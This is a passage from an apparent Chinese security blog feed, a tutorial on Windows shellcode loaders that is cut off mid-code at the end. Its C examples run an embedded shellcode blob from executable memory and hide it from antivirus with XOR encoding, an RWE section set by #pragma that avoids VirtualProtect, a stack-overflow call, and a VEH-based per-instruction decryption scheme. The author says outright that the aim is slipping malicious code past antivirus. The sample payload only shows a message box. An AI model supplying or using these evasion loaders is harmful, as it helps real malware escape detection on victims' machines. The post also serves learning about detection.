class="number">6</span>;</span><br></pre></td></tr></tbody></table></figure><p>ExceptionRecord-&gt;ExceptionAddress是触发异常的地址</p><p>ExceptionRecord-&gt;ExceptionCode表示异常的类型</p></blockquote><p>异常类型</p><p><img src="/2022/04/10/VEH/1649646418174.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;VEH&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>shellcode知识</title>
    <link href="https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/"/>
    <id>https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/</id>
    <published>2022-04-10T01:12:25.000Z</published>
    <updated>2022-04-20T05:29:09.167Z</updated>
    
    <content type="html"><![CDATA[<p>shellcode</p><span id="more"></span> <h1 id="0x00-Shellcode"><a class="header-anchor" href="#0x00-Shellcode">¶</a>0x00-Shellcode</h1><p>什么是shellcode</p><blockquote><p>在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码</p></blockquote><h1 id="0x01-杀毒软件甄别病毒的技术原理"><a class="header-anchor" href="#0x01-杀毒软件甄别病毒的技术原理">¶</a>0x01-杀毒软件甄别病毒的技术原理</h1><h2 id="基于特征进行甄别"><a class="header-anchor" href="#基于特征进行甄别">¶</a>基于特征进行甄别</h2><p>主要是病毒以前留下的信息，基于这些信息，我们可以判断存在病毒。</p><p>我们知道在PE文件中的.text段存放的是可执行代码，而杀毒软件会将其内容读取出来，并进行程序特征提取，判断可执行代码中是否存在病毒的特征，有的话就确定该程序存在病毒。</p><p>这也就是为什么病毒还未运行就被发现的原因。</p><h2 id="基于病毒的行为进行甄别"><a class="header-anchor" href="#基于病毒的行为进行甄别">¶</a>基于病毒的行为进行甄别</h2><p>主要是针对病毒行为的敏感操作，当病毒想干坏事的时候，难免会调用API，当出现比较敏感的操作时，确定该程序为病毒。</p><h1 id="0x03-一个简单的Loader"><a class="header-anchor" href="#0x03-一个简单的Loader">¶</a>0x03-一个简单的Loader</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//将shellcode复制到内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">/*DWORD dold;</span></span><br><span class="line"><span class="comment">VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//强制转换为函数</span></span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行时会直接弹出消息框</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649555515604.png" alt></p><p>整个过程就是先开辟内存（注意要注意属性），然后将shellcode复制到内存中，再将我们复制的数据强制转换为函数并进行调用。这些行为和特征都是没有什么问题的，所以如果我们插入的是恶意代码，是可以绕过杀毒软件的。</p><h1 id="0x04-优化Loader"><a class="header-anchor" href="#0x04-优化Loader">¶</a>0x04-优化Loader</h1><h2 id="内存分配优化"><a class="header-anchor" href="#内存分配优化">¶</a>内存分配优化</h2><p>因为数据本身就占有内存，所以不需要重新进行分配，直接使用即可</p><h2 id="改变属性"><a class="header-anchor" href="#改变属性">¶</a>改变属性</h2><p>因为数据存储于数据段中，而我们要让其可以执行，则需要改变其属性为可执行</p><blockquote><p>0xC000005报错表示内存访问的属性问题</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>第一个参数是地址起始位置</p><p>第二个参数是需要改变的内存大小</p><p>第三个参数是想要改变的属性</p><p>主要有</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/42dad68bad2c64271524c48a96f3822.png" alt></p><p>第四个参数</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556346133.png" alt></p><p>所以我们要让他指向有效变量，而不能是NULL</p><h2 id="最终效果-v3"><a class="header-anchor" href="#最终效果-v3">¶</a>最终效果</h2><p>不知道为什么使用这种方法在VS会报错-无法强制转换</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556539202.png" alt></p><h1 id="0x05-更进一步"><a class="header-anchor" href="#0x05-更进一步">¶</a>0x05-更进一步</h1><p>因为上一步将内存的属性修改并执行，那么一定会审计我们的shellcode，如果shellcode存在恶意的行为，很快就会被辨别出来，所以我们要对其进行加密，使其无法被识别。当然要注意要进行解密操作。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"vdata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()<span class="comment">//创建段，名称为vdata</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:vdata,RWE"</span>)<span class="comment">//修改段的属性</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode); ++i)</span><br><span class="line">{</span><br><span class="line">shellcode[i] ^= <span class="number">0x23</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//将shellcode复制到内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode); ++i)</span><br><span class="line">{</span><br><span class="line">*((<span class="keyword">char</span>*)Memory + i) ^= <span class="number">0x23</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">////DWORD dold;</span></span><br><span class="line"><span class="comment">////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">////强制转换为函数</span></span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因为杀毒软件可能将代码上传到云端跑（因为存在一些敏感行为，VirtualProtect等），这时候我们的shellcode可能被识别，所以我们要避免VirtualProtect操作，那么如何创建可读可写可执行的段呢。这时候就用到了预处理#pragma</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"vdata"</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"</span></span><br><span class="line"><span class="string">"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"</span></span><br><span class="line"><span class="string">"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"</span></span><br><span class="line"><span class="string">"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"</span></span><br><span class="line"><span class="string">"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"</span></span><br><span class="line"><span class="string">"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"</span></span><br><span class="line"><span class="string">"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3"</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()<span class="comment">//创建段，名称为vdata</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:vdata,RWE"</span>)<span class="comment">//修改段的属性</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//分配内存，并设置为可读可写可执行，大小为shellcode的大小</span></span><br><span class="line">LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (Memory == <span class="literal">NULL</span>)<span class="comment">//当开辟失败时，直接结束</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//将shellcode复制到内存中</span></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"><span class="comment">//DWORD dold;</span></span><br><span class="line"><span class="comment">//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//强制转换为函数</span></span><br><span class="line">((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="效果展示-v2"><a class="header-anchor" href="#效果展示-v2">¶</a>效果展示</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649557566937.png" alt></p><h1 id="0x06-栈溢出"><a class="header-anchor" href="#0x06-栈溢出">¶</a>0x06-栈溢出</h1><h2 id="栈溢出基础"><a class="header-anchor" href="#栈溢出基础">¶</a>栈溢出基础</h2><p>首先要先了解X86栈和函数调用的机制</p><p>首先先把call的下一条地址压入栈中，再把ebp压入栈，最后提升栈底，也就是mov ebp,esp，而函数内部的变量起始地址是ebp-0x04，依次往后，当给变量赋值过大的值时，可能会覆盖函数结束时ret的值，进而执行我们的shellcode</p><blockquote><p>数组的赋值是从低地址往高地址赋值</p></blockquote><p>所以我们可以通过数组越界覆盖ret原本的地址</p><p>代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//完成恶意代码的释放、解密、执行</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打了"</span>, <span class="string">"我错了"</span>, MB_OK);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2022</span>;<span class="comment">//0</span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };<span class="comment">//1,2</span></span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;<span class="comment">//3</span></span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578699864.png" alt></p><p>这里会先把0xD61212压入栈中</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578767663.png" alt></p><p>然后将ebp的值压入栈</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578844982.png" alt="ebp入栈"></p><p>提升栈底就不看了，来看变量的赋值过程，可以看到是从栈底往低地址压入的</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579064005.png" alt></p><p><strong>数组入栈</strong></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579162383.png" alt></p><p>可以看到这里是不一样的，数组下标小的元素在低地址，所以可以通过数组越界覆盖原本压入的call下一条地址</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579335339.png" alt></p><p>arr[0]是首元素，那么arr[5]对应的就是ret的地址</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br></pre></td></tr></tbody></table></figure><p>将shellcode的地址覆盖ret的地址</p><p>注意要有一个值占用arr[4]的值，或者直接使用arr[4]访问即可。</p><h2 id="分析利用"><a class="header-anchor" href="#分析利用">¶</a>分析利用</h2><p>因为在Main函数中执行恶意代码是很容易被察觉的，所以我们要阻断Main函数和恶意代码的联系</p><p>我们需要做到既不调用函数，又能让函数执行，即栈溢出</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//完成恶意代码的释放、解密、执行</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打了"</span>, <span class="string">"我错了"</span>, MB_OK);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2022</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line"><span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure><h2 id="效果-v2"><a class="header-anchor" href="#效果-v2">¶</a>效果</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559630756.png" alt></p><h2 id="分析-v13"><a class="header-anchor" href="#分析-v13">¶</a>分析</h2><p>为什么会执行呢，我们知道调用函数在汇编中要有call，但是我们并没有发现call指令</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559733763.png" alt></p><h1 id="0x07-shellcode的加密与释放"><a class="header-anchor" href="#0x07-shellcode的加密与释放">¶</a>0x07-shellcode的加密与释放</h1><p>即使我们对shellcode代码进行了加密，但是我们的shellcode一定会被解密并释放出来，这时候就难以绕过检测，所以我们要将我们的shellcode执行完就被擦除掉，让其不留痕迹。</p><p>这时候就需要异常处理机制（VEH）和栈溢出同时利用，对逐条恶意代码指令进行解密，然后调用，注意再每条指令最后加上CC，然后解密完代码后再重新指向llcode，让其触发异常。</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649571545227.png" alt></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"ldata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> trapcode[] = <span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> llcode = <span class="number">204</span>;<span class="comment">//CC 00 00 00INT3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:ldata,RWE"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">llcode = <span class="number">0xF333333333333333</span>;</span><br><span class="line">llcode &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>* data = (<span class="keyword">char</span>*)&amp;llcode;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 解密shellcode 并且执行</span></span><br><span class="line"><span class="comment">* len 解密后的指令长度</span></span><br><span class="line"><span class="comment">* data 把解密后的指令写入data</span></span><br><span class="line"><span class="comment">* 比如 push ebp 就向data写入0x55</span></span><br><span class="line"><span class="comment">* 每次解密一条指令 不要用超过7字节的指令和跳转指令</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打辣"</span>, <span class="string">"停下"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandle</span><span class="params">(PEXCEPTION_POINTERS 